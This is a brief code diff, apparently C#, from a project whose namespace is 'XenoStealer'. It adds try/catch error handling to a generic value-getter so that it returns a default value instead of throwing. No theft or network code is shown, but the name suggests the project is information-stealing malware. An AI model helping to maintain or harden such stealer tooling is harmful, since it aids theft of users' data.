@@ -131,8 +131,15 @@ namespace XenoStealer
 
         public T GetValue<T>(int index, string value) 
         {
-            object data = GetValue(index, value);
-            return (T)data;
+            try
+            {
+                object data = GetValue(index, value);
+                return (T)data;
+            }
+            catch 
+            { 
+                return default(T);
+            }
         }
 
         public void reset() 
